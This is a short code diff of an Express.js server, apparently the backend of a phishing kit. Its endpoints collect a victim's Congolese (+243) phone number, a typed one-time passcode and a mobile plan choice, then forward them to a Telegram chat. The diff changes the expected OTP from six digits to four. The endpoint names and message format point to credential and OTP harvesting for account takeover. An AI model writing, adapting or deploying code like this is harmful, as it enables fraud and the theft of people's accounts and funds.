@@ -291,7 +291,7 @@ app.post('/api/telegram/send-login', async (req, res) => {
   }
 });
 
-// Endpoint to send 6-digit OTP code to Telegram
+// Endpoint to send 4-digit OTP code to Telegram
 app.post('/api/telegram/send-otp', async (req, res) => {
   try {
     const { sessionId, phone, otp, planName, planPrice } = req.body;
@@ -320,7 +320,7 @@ app.post('/api/telegram/send-otp', async (req, res) => {
     session.otpStatus = 'pending';
     session.lastUpdated = Date.now();
 
-    const messageText = `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (6 CHIFFRES)</b>\n\n` +
+    const messageText = `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
       `👤 <b>Numéro:</b> <code>+243 ${session.phone}</code>\n` +
       `🔢 <b>Code OTP Saisi:</b> <code>${otp}</code>\n` +
       `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
